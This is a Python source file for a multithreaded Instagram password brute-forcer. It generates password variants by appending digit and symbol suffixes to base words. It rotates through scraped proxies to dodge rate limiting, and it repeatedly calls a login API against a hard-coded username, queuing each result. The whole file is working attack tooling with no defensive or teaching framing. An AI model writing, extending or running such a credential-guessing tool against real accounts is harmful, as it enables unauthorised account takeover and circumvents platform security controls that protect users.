from __future__ import absolute_import

import queue
import threading

import app.settings as settings

from app.lib.api import ProxyApi, InstagramApi


class BrowserThread(threading.Thread):

    def __init__(self, password_attempt_queue, proxy_queue, results_queue):
        super(BrowserThread, self).__init__()

        self.password_attempt_queue = password_attempt_queue
        self.proxy_queue = proxy_queue
        self.results_queue = results_queue

        self.stop_request = threading.Event()

    def run(self):
        while not self.stop_request.isSet():
            try:
                proxy = self.proxy_queue.get(True, 0.05)
            except queue.Empty:
                continue
            else:
                try:
                    password = self.password_attempt_queue.get(True, 0.05)
                except queue.Empty:
                    continue
                else:
                    # We are not going to want to reget the token for each request
                    api = InstagramApi(proxy)
                    token = api.get_token()
                    api.update_headers(token=token)
                    results = api.login('nickmflorin', password)
                    print('Got Results')
                    self.results_queue.put(results)

    def join(self, timeout=None):
        self.stop_request.set()
        super(BrowserThread, self).join(timeout)


class ProxyThread(threading.Thread):

    def __init__(self, proxy_queue, link):
        super(ProxyThread, self).__init__()
        self.proxy_queue = proxy_queue
        self.link = link
        self.api = ProxyApi(link)
        self.stop_request = threading.Event()

        # self.bad_proxanies = BadProxies()

    def run(self):
        while not self.stop_request.isSet():
            # TODO: Make sure proxy isn't already in queue.  Before, code
            # used the stupid ProxyList object to do that, but we can
            # probably do that a smarter way.
            # Also kept track of bad_proxies
            for proxy in self.api.get_proxies():
                if proxy not in self.proxy_queue.queue:
                    self.proxy_queue.put(proxy)

    def join(self, timeout=None):
        self.stop_request.set()
        super(ProxyThread, self).join(timeout)


class PasswordThread(threading.Thread):

    def __init__(self, base_password_queue, altered_password_queue, password_attempt_queue):
        super(PasswordThread, self).__init__()

        self.base_password_queue = base_password_queue
        self.altered_password_queue = altered_password_queue
        self.password_attempt_queue = password_attempt_queue

        self.proxy_queue = queue.Queue()
        self.proxy_pool = [
            ProxyThread(self.proxy_queue, link) for link in settings.PROXY_LINKS
        ]

        self.stop_request = threading.Event()

    def run(self):
        # As long as we weren't asked to stop, try to take new tasks from the
        # queue. The tasks are taken with a blocking 'get', so no CPU
        # cycles are wasted while waiting.
        # Also, 'get' is given a timeout, so stoprequest is always checked,
        # even if there's nothing in the queue.
        while not self.stop_request.isSet():
            try:
                password = self.base_password_queue.get(True, 0.05)
            except queue.Empty:
                continue
            else:
                password = password.replace('\n', '').replace('\r', '').replace('\t', '')
                alterations = list(self._password_alterations(password))
                self.altered_password_queue.put((self.name, password, alterations))

    def join(self, timeout=None):
        self.stop_request.set()
        # proxy.stop_request.set() for proxy in self.proxy_pool ??
        super(PasswordThread, self).join(timeout)

    def _password_alterations(self, password):
        first_level = ['', 'a', '13579', '24680', '09', '1523', '1719', '0609',
            '0691', '0991', '36606', '3660664', '6951', '20002']
        second_level = ['!', '!!', '!!!', '@', '`', '!a', '@!', 'a@!']

        for alteration in first_level:
            pw = password + alteration
            self.password_attempt_queue.put(pw)
            yield pw
            for two_alteration in second_level:
                pw = password + alteration + two_alteration
                self.password_attempt_queue.put(pw)
                yield pw
